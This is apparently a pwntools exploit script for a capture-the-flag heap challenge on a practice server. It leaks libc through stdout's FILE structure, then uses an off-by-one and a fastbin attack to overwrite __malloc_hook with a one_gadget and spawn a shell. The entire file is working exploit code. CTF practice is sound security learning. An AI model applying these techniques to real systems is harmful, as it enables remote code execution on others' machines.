from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('nsctf_online_2019_pwn1')
io = remote('node4.buuoj.cn', 27391)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
libc = ELF('libc-2.23.so')
elf = ELF('nsctf_online_2019_pwn1')
# one_gadgets_1604 = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one_gadgets_1604 = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

def add(size, content):
    io.sendlineafter('5.exit', '1')
    io.sendlineafter('Input the size:', str(size))
    io.sendafter('Input the content:', content)


def delete(index):
    io.sendlineafter('5.exit', '2')
    io.sendlineafter('Input the index:', str(index))


def edit(index, size, content):
    io.sendlineafter('5.exit', '4')
    io.sendlineafter('Input the index:', str(index))
    io.sendlineafter('Input size:', str(size))
    io.sendafter('Input new content:', content)


def leak():
    global libc_base
    add(0x18, 'chunk0')                                         # index0
    payload = p64(0xfbad1800) + p64(0) * 3 + p8(0)
    edit(-16, len(payload), payload)
    libc_base = u64(io.recvuntil(b'\x7f\x00\x00')[-8:]) - libc.sym['_IO_file_jumps']
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc = libc_base + libc.sym['realloc']
    one_gadget = libc_base + one_gadgets_1604[3]
    add(0x108, b'chunk1'.ljust(0xf0, b'\x00') + p64(0x100))     # index1
    add(0x88, 'chunk2')                                         # index2
    delete(1)
    edit(0, 0x18, 'a' * 0x18)
    add(0x88, 'chunk1_0')                                       # index1
    add(0x68, 'chunk1_1')                                       # index3
    delete(1)
    delete(2)
    # delete(3)
    payload = b'\x00' * 0x88 + p64(0x71)
    add(0xf8, payload)                                          # index1
    delete(3)
    payload = b'\x00' * 0x88 + p64(0x71) + p64(__malloc_hook - 0x23)
    edit(1, len(payload), payload)
    add(0x68, 'a')
    add(0x68, b'a' * 0xb + p64(one_gadget) + p64(realloc))
    io.sendlineafter('5.exit', '1')
    # gdb.attach(io)
    io.sendlineafter('Input the size:', '1')
    # pause()
    io.interactive()


if __name__ == '__main__':
    leak()
    pwn()
